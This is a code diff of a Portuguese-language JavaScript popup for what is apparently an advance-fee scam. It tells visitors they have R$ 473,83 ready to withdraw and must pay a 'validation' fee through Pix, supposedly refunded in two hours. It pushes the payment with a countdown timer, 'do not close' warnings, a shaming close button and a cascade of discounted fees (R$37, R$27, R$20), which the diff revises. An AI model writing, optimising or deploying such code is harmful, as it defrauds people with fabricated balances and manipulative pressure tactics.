@@ -11,26 +11,15 @@
 
   /* =====================================================
      OFERTAS EM CASCATA
-     1 → Preço cheio (R$67)
-     2 → Downsell 1  (R$37)
-     3 → Downsell 2  (R$27 — última chance)
+     1 → Downsell 1 (R$37)
+     2 → Downsell 2 (R$27)
+     3 → Downsell 3 (R$20 — última chance)
      ===================================================== */
   const OFFERS = [
     {
       badge:  '⚠️ AGUARDE — NÃO FECHE!',
-      title:  'Seu saque ainda está reservado!',
-      desc:   'Sua conta está com <strong>R$ 473,83 prontos para saque</strong>. Mas você precisa validar agora — em minutos esse valor será liberado para outra pessoa.',
-      price:  67.00,
-      priceLabel: 'R$ 67,00',
-      oldPrice: null,
-      btnText: '💰 VALIDAR AGORA — R$ 67,00',
-      btnColor: 'linear-gradient(135deg, #16a34a, #22c55e)',
-      closeText: 'Não quero meu dinheiro',
-    },
-    {
-      badge:  '🔥 DESCONTO EXCLUSIVO!',
       title:  'Espera! Reduzimos a taxa pela metade!',
-      desc:   'Como você ainda não confirmou, estamos oferecendo um <strong>desconto especial de 45%</strong>. Pague apenas R$ 37,00 e receba todos os seus ganhos agora!',
+      desc:   'Sua conta está com <strong>R$ 473,83 prontos para saque</strong>. Mas para ajudar você, liberamos um <strong>desconto especial de 45%</strong>. Valide agora por apenas R$ 37,00!',
       price:  37.00,
       priceLabel: 'R$ 37,00',
       oldPrice: 'R$ 67,00',
@@ -291,7 +280,7 @@
 
         <div id="br-price-box">
           <div id="br-old-price" style="display:none"></div>
-          <div id="br-new-price">R$ 67,00</div>
+          <div id="br-new-price">R$ 37,00</div>
           <div id="br-price-note">Taxa única · Devolvida em 2h junto com seu saque</div>
         </div>
 
@@ -300,7 +289,7 @@
           <span id="br-clock">05:00</span>
         </div>
 
-        <button id="br-cta">💰 VALIDAR AGORA — R$ 67,00</button>
+        <button id="br-cta">⚡ APROVEITAR DESCONTO — R$ 37,00</button>
         <button id="br-close">Não quero meu dinheiro</button>
       </div>
 
@@ -375,7 +364,7 @@
      BUTTON ACTIONS
      ===================================================== */
   document.getElementById('br-cta').addEventListener('click', () => {
-    const amount = OFFERS[level] ? OFFERS[level].price : 67;
+    const amount = OFFERS[level] ? OFFERS[level].price : 37;
     closeOffer();
     if (typeof window.abrirPix === 'function') {
       window.abrirPix(amount);
@@ -404,17 +393,14 @@
     });
   }
 
-  // Múltiplos gatilhos para garantir ativação em mobile
   if (document.readyState === 'complete') {
     arm();
   } else {
     window.addEventListener('load', arm);
   }
 
-  // Fallback após 1.5s
   setTimeout(arm, 1500);
 
-  // Expor para testes manuais
   window.BR_show = showOffer;
 
 })();
